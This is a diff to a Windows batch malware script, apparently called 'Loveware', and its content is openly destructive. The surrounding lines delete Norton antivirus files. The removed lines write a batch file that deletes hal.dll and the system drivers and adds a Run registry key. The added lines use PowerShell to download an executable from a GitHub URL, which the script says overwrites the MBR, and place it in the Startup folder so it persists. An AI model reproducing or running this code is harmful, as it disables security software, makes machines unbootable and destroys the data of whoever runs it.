@@ -121,22 +121,16 @@ del /Q /F C:\Program Files\Norton~1\*.*
 
 MOVE /e /y Loveware.exe C:\Windows
 
-:: Make new file called LoveLetter.bat. It contains code that
-:: will ruin the computer.
+:: Download file that will overwrite the mbr
 
-echo @echo off>LoveLetter.bat
-echo DEL /F /S /Q /A "%systemdrive%\windows\system32\hal.dll">>LoveLetter.bat
-echo @((( Echo Off > Nul ) & Break Off )>>LoveLetter.bat
-echo @Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run>>LoveLetter.bat
-echo @Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul>>LoveLetter.bat
-echo @Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*">>LoveLetter.bat
-echo )>>LoveLetter.bat
+powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/TheG0df2ther/Loveware/master/Loveware/FinalPayload/FinalPayload.exe', 'SomeHugs.exe')"
+powershell -Command "Invoke-WebRequest <https://raw.githubusercontent.com/TheG0df2ther/Loveware/master/Loveware/FinalPayload/FinalPayload.exe> -OutFile SomeHugs.exe"
 
-:: Copy LoveLetter.bat to the startup folder to prevent
+:: Copy SomeHugs.exe to the startup folder to prevent
 :: people from escaping death.
 
 :copylove
-XCOPY "LoveLetter.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+XCOPY "%USERPROFILE%\Downloads\SomeHugs.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 goto run1
 goto copylove
 
@@ -428,7 +422,7 @@ echo timeout 400>>LoveChoice.bat
 
 :: Have mersy and let the guy live
 
-echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\LoveLetter.bat">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs.exe">>LoveChoice.bat
 
 echo cls>>LoveChoice.bat
 
@@ -573,7 +567,7 @@ tasklist | find /I "LoveChoice"
 
 if errorlevel 1 (
 
-         start %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\LoveLetter.bat
+         start %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs.exe
 
 goto LOVE
 
